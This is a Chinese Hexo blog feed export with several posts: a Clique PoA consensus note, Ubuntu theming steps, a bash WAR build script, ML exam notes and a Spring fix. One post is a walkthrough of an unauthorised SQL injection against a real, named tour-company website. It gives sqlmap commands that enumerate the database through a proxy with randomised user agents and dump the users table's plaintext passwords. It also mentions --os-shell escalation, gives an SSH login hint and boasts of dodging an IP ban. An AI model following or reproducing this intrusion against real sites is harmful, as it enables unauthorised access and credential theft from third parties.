class="code"><pre><span class="line">创世块中指定一组初始授权的signers,所有地址保存在创世区块(Genesis Block),并且把该区块的hash写到钱包里。</span><br><span class="line"></span><br><span class="line">启动挖矿后, 该组signers开始对生成的block进行签名并广播</span><br><span class="line"></span><br><span class="line">签名结果保存在区块头的Extra字段中</span><br><span class="line"></span><br><span class="line">Extra中更新当前高度已授权的所有signers的地址,因为有新加入或踢出的signer</span><br><span class="line"></span><br><span class="line">每一高度都有一个signer处于IN-TURN状态, 其他signer处于OUT-OF-TURN状态, IN-TURN的signer签名的block会立即广播, OUT-OF-TURN的signer签名的block会延时一段时间后再广播, 保证IN-TURN的签名block有更高的优先级上链</span><br><span class="line"></span><br><span class="line">如果需要加入一个新的signer,signer通过API接口发起一个proposal, 该proposal通过复用区块头 Coinbase(新signer地址)和Nonce(&quot;0xffffffffffffffff&quot;) 字段广播给其他节点. 所有已授权的signers对该新的signer进行&quot;加入&quot;投票, 如果赞成票超过signers总数的50%, 表示同意加入</span><br><span class="line"></span><br><span class="line">如果需要踢出一个旧的signer, 所有已授权的signers对该旧的signer进行&quot;踢出&quot;投票, 如果赞成票超过signers总数的50%, 表示同意踢出</span><br></pre></td></tr></table></figure><h2 id="Solidity"><a href="#Solidity" class="headerlink" title="Solidity"></a>Solidity</h2><p>code<br>请稍等</p>]]></content>
      
      
      <categories>
          
          <category> Solidity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
            <tag> ML </tag>
            
            <tag> blockchain </tag>
            
            <tag> Solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap注入拿后台</title>
      <link href="/2019/07/15/2019-07-15-sqlmap-1/"/>
      <url>/2019/07/15/2019-07-15-sqlmap-1/</url>
      
        <content type="html"><![CDATA[<p><strong>本文过程中无破坏性操作</strong><br>对于这种php的无防站，直接用sqlmap+msf就可以拿。<br>对于那些暴露参数的php站的可以直接拿库，刚刚随便找了个。<br>2019-07-16:被发现了。。ip被黑名单，于是换了个节点。。。还可以登录</p><a id="more"></a><h2 id="先找后台（这位老哥直接在右上角放了链接）"><a href="#先找后台（这位老哥直接在右上角放了链接）" class="headerlink" title="先找后台（这位老哥直接在右上角放了链接）"></a>先找后台（这位老哥直接在右上角放了链接）</h2><p><a href="http://hesselgravetours.com/event.php?tourID=1721" target="_blank" rel="noopener">http://hesselgravetours.com/event.php?tourID=1721</a></p><ul><li>check databases<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 --dbs --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-1.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check tables<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave --tables --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-2.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>check columns<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users --columns --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-3.png" alt title>                </div>                <div class="image-caption"></div>            </figure><ul><li>dump <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://****tours.com/event.php?tourID=1721 -D hesselgrave -T users -C username,userID,password,accesslevel --dump --proxy socks5://127.0.0.1:1080 --random-agent</span><br></pre></td></tr></table></figure></li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-4.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>可见没经过加密。。<br>如果经过了简单加密的话（如mysql的md5(passwd)），就可以找个在线网站撞（比如<a href="https://www.cmd5.com/）" target="_blank" rel="noopener">https://www.cmd5.com/）</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/hessel-5.JPG" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="后续不贴了。"><a href="#后续不贴了。" class="headerlink" title="后续不贴了。"></a>后续不贴了。</h2><p><strong>防御太低有好几种方法找到路进行提权</strong></p><ul><li>因为在前面已经得到系统是FreeBSD或者是其他linux，并且得到网站运行在的用户名是content，懂我意思吧</li><li>继续用sqlmap –os-shell提权，第一次没有找到上传点</li><li>后台找到这个admin/documents/clients_recordview.php</li></ul><h2 id="插-入-服-务-器"><a href="#插-入-服-务-器" class="headerlink" title="插 入 服 务 器"></a>插 入 服 务 器</h2><p>提示是：<br>ssh -o HostKeyAlgorithms=+ssh-dss <a href="mailto:content@hesselgravetours.com" target="_blank" rel="noopener">content@hesselgravetours.com</a></p><p>密码是<del><strong><strong>***</strong></strong></del><br>图片不贴了</p><h4 id="明天读一下"><a href="#明天读一下" class="headerlink" title="明天读一下"></a>明天读一下</h4><p><a href="https://arxiv.org/pdf/1502.01852.pdf" target="_blank" rel="noopener">https://arxiv.org/pdf/1502.01852.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> web </tag>
            
            <tag> sqlmap </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>部分MACOS风格的ubuntu</title>
      <link href="/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/"/>
      <url>/2019/07/09/2019-07-09-%E6%88%91%E7%9A%84ubuntu%E8%AE%BE%E7%BD%AE%E7%95%8C%E9%9D%A2%E9%A3%8E%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<p>记录一下以防以后电脑崩了还得重新配,感觉撑不住了</p><a id="more"></a><h3 id="效果这样"><a href="#效果这样" class="headerlink" title="效果这样"></a>效果这样</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/screenshot.png" alt title>                </div>                <div class="image-caption"></div>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-tweak-tool</span><br><span class="line">#extensions.gnome.org install [ User themes]</span><br><span class="line"> </span><br><span class="line">#www.gnome-look.org [ gtk-3 themes:McOS-HS]</span><br><span class="line">tar -zxvf McOS-HS-2-themes.tar.gz</span><br><span class="line">#go to tweaks and chose this theme</span><br><span class="line"></span><br><span class="line">tar -zxvf macOS11.tar.xz </span><br><span class="line">#extensions.gnome.org [dash-to-dock]</span><br><span class="line">#www.gnome-look.org [OSX.for.Dash.to.DOCK]</span><br><span class="line">#www.gnome-look.org [Icon Themes: macOS icons]</span><br><span class="line"># extensioons.gnome.org [blyr]</span><br></pre></td></tr></table></figure><p>go to tweaks and choose them</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/tweaks.png" alt title>                </div>                <div class="image-caption"></div>            </figure><p>cd ./OSX.for.Dash.to.DOCK/Dock Settings/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock show-apps-at-top true</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-running-dots false</span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-customize-running-dots false</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock custom-theme-shrink false</span><br><span class="line"></span><br><span class="line">gsettings set org.gnome.shell.extensions.dash-to-dock transparency-mode DEFAULT</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#www.gnome-look.org [GDM themes:SetAsWallpaper]</span></span><br><span class="line"></span><br><span class="line">mv ubuntu.css /usr/share/gnome-shell/theme/</span><br><span class="line"></span><br><span class="line">sudo mv /usr/share/gnome-shell/extensions/ubuntu-dock@ubuntu.com ~/</span><br></pre></td></tr></table></figure><h3 id="upgrade后锁屏界面恢复的问题"><a href="#upgrade后锁屏界面恢复的问题" class="headerlink" title="upgrade后锁屏界面恢复的问题"></a>upgrade后锁屏界面恢复的问题</h3><p>SetAsWallpaper里的ubuntu.css 更改到/usr/share/gnome-shell/theme/下，并把壁纸更换就ok了，因为upgrade的时候会更新gnome，theme会重新从源下载覆盖</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> tweak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用了个bash手动打包java项目并在tomcat中运行</title>
      <link href="/2019/07/03/2019-07-03-%E7%BB%8F%E7%AE%A1%E5%90%8C%E5%AD%A6%E7%9A%84tomcat%E9%A1%B9%E7%9B%AE/"/>
      <url>/2019/07/03/2019-07-03-%E7%BB%8F%E7%AE%A1%E5%90%8C%E5%AD%A6%E7%9A%84tomcat%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>觉得之前的那个jekyll的主题太丑了，今天翻新了一下，并把文章和live2d模型迁到了hexo(indigo主题，这次再也不改了)<br>帮信管专业的同学把项目部署到服务器上，因为没打包过war，中间有个地方卡住了，好麻烦记一下, （推荐了maven</p><a id="more"></a><h2 id="jdbc和tomcat和手写的DAO，怀旧。"><a href="#jdbc和tomcat和手写的DAO，怀旧。" class="headerlink" title="jdbc和tomcat和手写的DAO，怀旧。"></a>jdbc和tomcat和手写的DAO，怀旧。</h2><p>用idea打包：</p><p>先是在idea里面配置的Webapplication的archive，里面要选一个WEB-INF和META-INF。</p><p>将avaliavle elements进行put into outputroot操作，左边的out layout栏里，出现META-INF<br>build project 再 build artifacts</p><p>好了<br>但是报错了，不知道为啥，war包导出来了，tomcat运行出错。。nmd</p><p>项目结构这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">├── bin</span><br><span class="line">│   └── out.jar</span><br><span class="line">├── build</span><br><span class="line">│   └── source.txt</span><br><span class="line">├── build.sh</span><br><span class="line">├── classdesign.war</span><br><span class="line">├── out</span><br><span class="line">│   ├── artifacts</span><br><span class="line">│   └── production</span><br><span class="line">├── src</span><br><span class="line">│   ├── com</span><br><span class="line">│   └── MANIFEST.MF</span><br><span class="line">└── web</span><br><span class="line">    ├── commom</span><br><span class="line">    ├── css</span><br><span class="line">    ├── iconfont</span><br><span class="line">    ├── images</span><br><span class="line">    ├── js</span><br><span class="line">    └── WEB-INF</span><br></pre></td></tr></table></figure><h3 id="然后手动打包了，（写了个循环shellfor-javac）"><a href="#然后手动打包了，（写了个循环shellfor-javac）" class="headerlink" title="然后手动打包了，（写了个循环shellfor javac）"></a>然后手动打包了，（写了个循环shellfor javac）</h3><p><a href="https://github.com/waynamigo/templates/blob/master/bashs/build.sh" target="_blank" rel="noopener">代码在这</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#写到source，做个list，或者直接用idea生成source.txt也可以</span></span><br><span class="line">path=$(<span class="built_in">pwd</span>)</span><br><span class="line"><span class="function"><span class="title">dependence</span></span>()&#123;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> `ls <span class="variable">$1</span>|grep -v <span class="string">".bak"</span>`</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -d <span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span> ]</span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">      dependence <span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">local</span> file_path=<span class="variable">$1</span><span class="string">"/"</span><span class="variable">$file</span> </span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">echo</span> <span class="variable">$file_path</span>|grep <span class="string">"MANIFEST.MF"</span>&gt;/dev/null;<span class="keyword">then</span></span><br><span class="line">      c=c</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="built_in">echo</span> <span class="variable">$file_path</span> &gt;&gt; <span class="variable">$path</span>/build/<span class="built_in">source</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dependence <span class="variable">$path</span>/src</span><br><span class="line">libs=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> java_lib <span class="keyword">in</span> $(ls <span class="variable">$path</span>/web/WEB-INF/lib);<span class="keyword">do</span></span><br><span class="line"><span class="keyword">if</span> [[ libs != <span class="string">""</span> ]];<span class="keyword">then</span></span><br><span class="line">libs=<span class="variable">$libs</span>:<span class="variable">$path</span>/web/WEB-INF/lib/<span class="variable">$java_lib</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">libs=<span class="variable">$path</span>/web/WEB-INF/lib/<span class="variable">$java_lib</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">javac -encoding utf-8 -Xlint:unchecked -d <span class="variable">$path</span>/build -classpath <span class="variable">$path</span>/web/WEB-INF/lib @<span class="variable">$path</span>/build/<span class="built_in">source</span></span><br><span class="line">jar cvf  <span class="variable">$path</span>/src/MANIFEST.MF  <span class="variable">$path</span>/bin/classdesign.war ./*</span><br></pre></td></tr></table></figure><h3 id="把war烤到webapps执行startup-sh就可以运行了"><a href="#把war烤到webapps执行startup-sh就可以运行了" class="headerlink" title="把war烤到webapps执行startup.sh就可以运行了"></a>把war烤到webapps执行startup.sh就可以运行了</h3><h3 id="2019-7-19更新"><a href="#2019-7-19更新" class="headerlink" title="2019.7.19更新"></a>2019.7.19更新</h3><p>在开发板上（无IDE生成MAINFEST)打包注意jar时添加-m追加MAINFEST.MF的Main-Class字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jar -cvfm test.jar MAINFEST.MF test.class </span><br><span class="line"></span><br><span class="line">MAINFEST.MF</span><br><span class="line"></span><br><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: &lt;MAINCLASSNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> tomcat </tag>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习考试</title>
      <link href="/2019/06/25/2019-06-25-machinelearning/"/>
      <url>/2019/06/25/2019-06-25-machinelearning/</url>
      
        <content type="html"><![CDATA[<p>统  计  学  习<br>真正的统计学习笔记待更新，包括李航统计学习方法和All of Statics两本，</p><a id="more"></a><h2 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h2><p>选择 3分×9<br>简答题 5分×5<br>综合分析 7分×7</p><h2 id="绪论，回归"><a href="#绪论，回归" class="headerlink" title="绪论，回归"></a>绪论，回归</h2><ul><li><p>按学习方式分类的机器学习算法 四类</p></li><li><p>模型评估指标：泛化误差、经验误差</p></li><li><p>欠拟合和过拟合（避免过拟合的方法 正则化-L2、dropout等）</p></li><li><p>分类和聚类和回归的区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">回归和分类本质相同，都是根据训练集（有标签，有监督学习）做预测，区别是输出不同，分类是定性输出，回归是定量输出</span><br><span class="line">聚类是无监督学习，产生多个集合，单个集合中的元素属性相似</span><br></pre></td></tr></table></figure></li><li><p>多元线性回归求解权重w的方法：最小二乘、梯度下降、误差函数</p></li><li><p>非线性回归如何进行计算:通过中间函数映射</p></li><li><p>岭回归的特点（简答？</p><h2 id="LDA-应该有大题"><a href="#LDA-应该有大题" class="headerlink" title="LDA 应该有大题"></a>LDA 应该有大题</h2></li><li><p>LDA结构，LDA生成文档D的步骤（简答</p></li><li><p>使用LDA的目的：得到文章库中每篇文章的主题分布；<br>   得到新输入文章的主题分布。</p><h2 id="决策树-随机森林-支持向量机"><a href="#决策树-随机森林-支持向量机" class="headerlink" title="决策树 随机森林 支持向量机"></a>决策树 随机森林 支持向量机</h2></li><li><p>决策树是一种有监督的分类方法,它用已有的数据构造出一棵树,再用这棵树对新的数据进行预测。</p></li><li><p>学习过程：通过对训练样本的分析来确定“划分属性”（即内部结点所对应的属性）</p></li><li><p>预测过程：将测试示例从根结点开始，沿着划分属性所构成的“判定测试序列”下行，直到叶结点。</p></li><li><p>决策树（简答）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1构造过程：特征选择；决策树生成；剪枝（预剪枝和后剪枝的方法）是自根到叶的递归过程</span><br><span class="line">2生成停止条件</span><br><span class="line">当前结点包含的样本全属于同一类别，无需划分;</span><br><span class="line">当前属性集为空, 或是所有样本在所有属性上取值相同，无法划分;</span><br><span class="line">当前结点包含的样本集合为空，不能划分.</span><br><span class="line">3预剪枝：在构造树的过程中，对每个结点在划分前进行估计，如果当前结点的划分不能带来决策树模型泛化性能的提升，则不对当前结点进行划分并且将当前结点标记为叶结点。</span><br><span class="line">后剪枝：先把整颗决策树构造完毕，自底向上对非叶结点进行考察，若将该结点对应的子树换为叶结点能够带来泛化性能的提升，则把该子树替换为叶结点。</span><br><span class="line"></span><br><span class="line">（预剪后剪的对比）</span><br></pre></td></tr></table></figure><p>对节点划分的方法 信息增益 增益率 基尼指数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">信息增益=△信息熵，信息熵越小纯度越大</span><br><span class="line">根据基尼指数：选取划分后使基尼指数最小的属性</span><br></pre></td></tr></table></figure><ul><li>随机森林（简答）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原始训练集为D,应用Bootstrap法有放回地随机抽取k个新的自助样本集,并由此构建k 棵决策树</span><br><span class="line">每棵树最大限度地生长,不做任何修剪</span><br><span class="line">将生成的多棵决策树组成随机森林,用随机森林分类器对新的数据进行判别与分类,森林中的每一棵树都对新的数据进行预测和投票,最终得票最多的分类项即为随机森林对该数据的预测结果。</span><br><span class="line"></span><br><span class="line">优点：随机森林对于高维数据集的处理能力比较好,它可以处理成千上万的输入变量,并确定最重要的变量,因此被认为是一个不错的降维方法。此外,该模型能够输出变量的重要性程度,这是一个非常便利的功能。</span><br><span class="line">在对缺失数据进行估计时,随机森林是一个十分有效的方法。就算存在大量的数据缺失,随机森林也能较好地保持精确性。</span><br><span class="line">当存在分类不平衡的情况时,随机森林能够提供平衡数据集误差的有效方法。</span><br><span class="line">缺点：随机森林给人的感觉像是一个黑盒子———你几乎无法控制模型内部的运行,只能在不同的参数和随机种子之间进行尝试,从而得到一个更优的分类器。</span><br></pre></td></tr></table></figure><ul><li>支持向量机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">概念：基本模型定义为特征空间上的间隔最大的线性分类器（按监督学习方式对数据进行二分类的广义线性分类器）</span><br><span class="line">决策边界是对学习样本求解的最大边距超平面</span><br></pre></td></tr></table></figure><ul><li>间隔，最大间隔</li><li>超平面的距离计算（可能考计算 r = |w.T·x+b|/|w|</li><li>核方法 设计核函数（综合题）根据mercer定理：若一个对称函数所对应的核矩阵半正定，那么它可以设为核函数<h2 id="神经网络-kmeans"><a href="#神经网络-kmeans" class="headerlink" title="神经网络 kmeans"></a>神经网络 kmeans</h2></li><li>结构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入层：接受来自网络外部的数据的顶点</span><br><span class="line">隐藏层：除了输入层和输出层以外的其他层</span><br><span class="line">输出层：向网络外部输出数据的顶点</span><br></pre></td></tr></table></figure><ul><li>超参数有哪些</li><li>如何衡量你的预测算法，损失函数loss</li><li>感知机是啥</li><li>BP是啥 RBF是啥 hopfield是啥 SOM是啥</li><li>计算隐藏层结点数目</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">隐层结点数s与模式数N的关系是：s＝log2N；</span><br><span class="line">隐层结点数s＝2n＋1（n为输入层结点数）；</span><br></pre></td></tr></table></figure><ul><li>CNN</li><li>LSTM</li><li>聚类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">优点</span><br><span class="line">1.原理简单，实现方便，收敛速度快；</span><br><span class="line">2.聚类效果较优；</span><br><span class="line">3.模型的可解释性较强；</span><br><span class="line">4.调参只需要簇数k；</span><br><span class="line">缺点：</span><br><span class="line">1.k的选取不好把握；</span><br><span class="line">2.初始聚类中心的选择；</span><br><span class="line">3.如果数据的类型不平衡，比如数据量严重失衡或者类别的方差不同，则聚类效果不佳；</span><br><span class="line">4.采用的是迭代的方法，只能得到局部最优解；</span><br><span class="line">5.对于噪声和异常点比较敏感。</span><br></pre></td></tr></table></figure><ul><li>聚类性能度量 外部指标 内部指标</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外：聚类结果与某个“参考模型”(reference model) 进行比较，需要标记数据如Jaccard 系数，FM 指数，Rand 指数</span><br><span class="line">内：直接考察聚类结果而不用任何参考模型，类内聚集程度和类间离散程度。定义簇内样本间的距离，簇间距离，如DB 指数，Dunn 指数等</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这学期项目中的坑</title>
      <link href="/2019/06/12/2019-06-12-%E9%A1%B9%E7%9B%AE%E5%9D%91/"/>
      <url>/2019/06/12/2019-06-12-%E9%A1%B9%E7%9B%AE%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>佛了</p><a id="more"></a><h2 id="mysql分离-springboot-eurake"><a href="#mysql分离-springboot-eurake" class="headerlink" title="mysql分离 + springboot + eurake"></a>mysql分离 + springboot + eurake</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原因是 配置远程数据库时，springboot 没有创建表，自己手动建了hibernate sequence后就会报这个错。</span><br><span class="line">表现为插入数据失败，error &quot;could not read a hi value - you need to populate the table&quot;.</span><br><span class="line"></span><br><span class="line">解决方法是对nextval设置初始值，stackoverflow的另一种方案是</span><br><span class="line">改掉注释</span><br><span class="line">@GeneratedValue(strategy = GenerationType.AUTO)改为@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jekyll加入live2d的模型</title>
      <link href="/2019/05/14/2019-05-14-jekyll%E5%8A%A0%E5%85%A5live2d%E6%A8%A1%E5%9E%8B/"/>
      <url>/2019/05/14/2019-05-14-jekyll%E5%8A%A0%E5%85%A5live2d%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p><del>由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下</del><br>2019-8-1: 迁hexo了。</p><a id="more"></a><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>npm install hexo-cli</p><p>使用hexo初始化一个本地的博客文件夹 hexo init</p><p>安装需要的依赖 npm install就可以了</p><h3 id="在hexo安装live2d插件"><a href="#在hexo安装live2d插件" class="headerlink" title="在hexo安装live2d插件"></a>在hexo安装live2d插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br></pre></td></tr></table></figure><ul><li>详见 <a href="https://github.com/EYHN/hexo-helper-live2d" target="_blank" rel="noopener">hexo-helper-live2d</a></li></ul><h3 id="在hexo配置一下"><a href="#在hexo配置一下" class="headerlink" title="在hexo配置一下"></a>在hexo配置一下</h3><p>在config里面加入live2d的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hexo-helper-live2d项目给的配置文件例子</span><br><span class="line">live2d:</span><br><span class="line">  model:</span><br><span class="line">    scale: 1</span><br><span class="line">    hHeadPos: 0.5</span><br><span class="line">    vHeadPos: 0.618</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">    position: right</span><br><span class="line">    hOffset: 0</span><br><span class="line">    vOffset: -20</span><br><span class="line">  mobile:</span><br><span class="line">    show: true</span><br><span class="line">    scale: 0.5</span><br><span class="line">  react:</span><br><span class="line">    opacityDefault: 0.7</span><br><span class="line">    opacityOnHover: 0.2</span><br></pre></td></tr></table></figure><p>找你要加入的live2d模型（有钱的可以去订做，把widget替换掉。</p><p><strong>koharu在这里面<a href="https://github.com/xiazeyu/live2d-widget-models" target="_blank" rel="noopener">live2d-widget-model</a></strong></p><p>clone所需要的live2d模型后，还需要在config里面加入一个live2d配置。</p><p>配置文件如下<del>（注释是wife还行）</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#wife</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: koharu  